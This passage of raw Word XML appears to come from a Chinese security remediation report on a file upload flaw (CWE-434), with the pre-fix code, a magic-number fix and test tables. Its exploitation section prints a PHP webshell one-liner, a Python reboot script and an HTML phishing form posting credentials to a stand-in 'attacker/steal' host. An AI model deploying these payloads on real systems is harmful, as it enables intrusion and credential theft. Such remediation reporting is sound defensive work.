                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>static/uploads/{uuid}.html</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 已阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">上传文件名为 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>avatar.jpg</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">保存为 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>static/uploads/{uuid}.jpg</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 通过</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>验证生成的 URL 是否使用 UUID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/static/uploads/{uuid}.jpg</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 正确</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>【漏洞 9】上传文件内容未检测 — 图片马/WebShell（CWE-434）</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4703"/>
        <w:gridCol w:w="4703"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>条目</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞接口</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>POST /upload</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>原始风险等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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高危</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>当前状态</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-434: Unrestricted Upload of File with Dangerous Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>漏洞形成原理（修复前）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>扩展名白名单仅校验文件后缀是否属于允许的类型，但</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>未对文件内容进行任何检测</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">。攻击者可以将恶意代码保存为图片后缀的文件——扩展名为 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>.jpg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>，但文件头和数据完全是代码内容。这种图片马可以通过扩展名校验，但实际内容可在其他场景下被触发执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># 修复前：仅检查扩展名</w:t>
        <w:br/>
        <w:t>ALLOWED_EXT = {"jpg", "jpeg", "png", "gif", "webp", "bmp"}</w:t>
        <w:br/>
        <w:t>ext = file.filename.rsplit(".", 1)[-1].lower()</w:t>
        <w:br/>
        <w:t>if ext in ALLOWED_EXT:          # 只要后缀对，不管内容是什么</w:t>
        <w:br/>
        <w:t xml:space="preserve">    file.save(filepath)          # 恶意内容被保存到服务器</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>利用方式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># 场景 A — PHP Webshell 图片马（如果服务器有 PHP）</w:t>
        <w:br/>
        <w:t>echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.jpg</w:t>
        <w:br/>
        <w:t># 扩展名 jpg 通过白名单校验</w:t>
        <w:br/>
        <w:t># 文件内容完全是 PHP 代码，无任何图片特征</w:t>
        <w:br/>
        <w:br/>
        <w:t># 场景 B — Python 脚本伪装</w:t>
        <w:br/>
        <w:t>#!/usr/bin/env python3</w:t>
        <w:br/>
        <w:t>import os</w:t>
        <w:br/>
        <w:t>os.system("reboot")</w:t>
        <w:br/>
        <w:t># 保存为 shell.jpg，无任何 JPEG Magic Number</w:t>
        <w:br/>
        <w:br/>
        <w:t># 场景 C — HTML 钓鱼页面伪装</w:t>
        <w:br/>
        <w:t>&lt;html&gt;&lt;body&gt;&lt;form action="https://attacker/steal" method="POST"&gt;</w:t>
        <w:br/>
        <w:t>&lt;input name="username"&gt;&lt;input name="password"&gt;</w:t>
        <w:br/>
        <w:t>&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</w:t>
        <w:br/>
        <w:t># 保存为 phishing.jpg，实为 HTML 钓鱼页面</w:t>
        <w:br/>
        <w:br/>
        <w:t># 场景 D — 结合 LFI 触发</w:t>
        <w:br/>
        <w:t># 如果图片马通过路径穿越写入 templates/ 目录</w:t>
        <w:br/>
        <w:t># 访问触发 SSTI/RCE</w:t>
        <w:br/>
        <w:t># 如果保存在 uploads/ 目录</w:t>
        <w:br/>
        <w:t># 通过 LFI 读取并渲染 → 触发执行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>安全危害</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 绕过扩展名白名单</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：仅靠后缀判断文件类型完全不可靠</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 远程代码执行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：恶意文件结合路径穿越或 LFI 可升级为 RCE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 钓鱼攻击</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：HTML 内容的图片文件可通过 LFI 渲染为钓鱼页面</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 检测难度高</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：传统安全设备仅检查扩展名，无法识别内容异常的图片伪装文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Magic Number 文件幻数十进制校验</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>——验证文件真实类型：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>magic_bytes = file.read(16)</w:t>
        <w:br/>
        <w:t>file.seek(0)</w:t>
        <w:br/>
        <w:br/>
        <w:t># 各种图片格式的 Magic Number</w:t>
        <w:br/>
        <w:t>magic_map = {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    b"\xff\xd8": "jpg",           # JPEG</w:t>
        <w:br/>
        <w:t xml:space="preserve">    b"\x89PNG\r\n\x1a\n": "png",  # PNG</w:t>
        <w:br/>
        <w:t xml:space="preserve">    b"GIF87a": "gif",             # GIF</w:t>
        <w:br/>
        <w:t xml:space="preserve">    b"GIF89a": "gif",             # GIF</w:t>
        <w:br/>
        <w:t xml:space="preserve">    b"RIFF": "webp",              # WebP</w:t>
        <w:br/>
        <w:t xml:space="preserve">    b"BM": "bmp",                 # BMP</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>detected_ext = None</w:t>
        <w:br/>
        <w:t>for magic, mext in magic_map.items():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if magic_bytes[:len(magic)] == magic:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        detected_ext = mext</w:t>
        <w:br/>
        <w:t xml:space="preserve">        break</w:t>
        <w:br/>
        <w:br/>
        <w:t>if detected_ext is None:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return render_template("upload.html", error="文件内容不是有效的图片格式"), 400</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复效果验证</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>测试用例</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>预期结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>实际结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>真实 JPEG 文件（含 JFIF 头）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>上传成功</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 通过</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>真实 PNG 文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>上传成功</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 通过</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>PHP Shell 文件后缀改为 .jpg</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>拒绝上传</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅ 已阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;script&gt;</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> 文本保存为 .png</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>拒绝上传</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
